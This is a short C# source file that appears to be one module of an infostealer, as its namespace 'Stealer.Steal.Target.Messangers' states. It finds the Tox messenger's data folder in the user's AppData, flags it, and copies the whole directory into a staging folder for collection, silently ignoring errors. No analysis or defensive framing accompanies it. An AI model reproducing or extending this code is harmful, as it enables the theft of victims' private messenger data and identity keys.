using System;
using System.IO;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Messangers;

internal class Tox
{
	public static string ToxPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Tox");

	public static void Start()
	{
		try
		{
			if (Directory.Exists(ToxPath))
			{
				Counter.Tox = true;
				DynamicFiles.CopyDirectory(ToxPath, Path.Combine("Messengers", "Tox"));
			}
		}
		catch
		{
		}
	}
}
